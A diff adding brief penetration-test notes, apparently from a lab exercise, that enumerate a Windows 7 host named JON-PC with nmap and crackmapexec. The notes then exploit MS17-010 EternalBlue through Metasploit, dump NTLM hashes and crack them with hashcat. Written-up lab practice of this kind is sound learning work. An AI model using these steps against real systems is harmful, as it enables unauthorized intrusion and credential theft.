@@ -1,0 +1,59 @@
+#####Eternal Blue
+
+1-Enumeration:
+    nmap -T5 -sV -sC -Pn 10.10.252.95 -oN enum/AllPortsSRV01.logs  -vv
+        PORT      STATE SERVICE            REASON  VERSION
+        135/tcp   open  msrpc              syn-ack Microsoft Windows RPC
+        139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
+        445/tcp   open  microsoft-ds       syn-ack Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
+        3389/tcp  open  ssl/ms-wbt-server? syn-ack
+
+        Host script results:
+        | smb-security-mode: 
+        |   account_used: guest
+        |   authentication_level: user
+        |   challenge_response: supported
+        |_  message_signing: disabled (dangerous, but default)
+        |_clock-skew: mean: 1h12m00s, deviation: 2h41m00s, median: 0s
+        
+        | nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:d4:0f:5f:f2:db (unknown)
+        | Names:
+        |   JON-PC<00>           Flags: <unique><active>
+        |   WORKGROUP<00>        Flags: <group><active>
+        |   JON-PC<20>           Flags: <unique><active>
+        |   WORKGROUP<1e>        Flags: <group><active>
+        |   WORKGROUP<1d>        Flags: <unique><active>
+        |
+        | smb2-time: 
+        |   date: 2024-02-10T01:57:25
+        |_  start_date: 2024-02-10T01:54:40
+        | smb2-security-mode: 
+        |   2:1:0: 
+        |_    Message signing enabled but not required
+        | smb-os-discovery: 
+        |   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+        |   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+        |   Computer name: Jon-PC
+        |   NetBIOS computer name: JON-PC\x00
+        |   Workgroup: WORKGROUP\x00
+        |_  System time: 2024-02-09T19:57:25-06:00
+
+    Enumeration SMB:
+
+        crackmapexec smb 10.10.252.95 -u '' -p '' --shares -d Workgroup
+            SMB         10.10.252.95    445    JON-PC           [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:JON-PC) (domain:Workgroup) (signing:False) (SMBv1:True)
+            SMB         10.10.252.95    445    JON-PC           [+] Workgroup\: 
+            SMB         10.10.252.95    445    JON-PC           [-] Error enumerating shares: STATUS_ACCESS_DENIED
+
+
+Exploit - MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption :
+    msfconsole
+        use exploit/windows/smb/ms17_010_eternalblue
+        options 
+    
+    Exploit Works
+        hasdump give us the NTLM Hash
+            echo <3rd part NTLM Hash>
+            hashcat NTLM.hash /usr/share/wordlists/rockyou.txt -m 1000
+
+
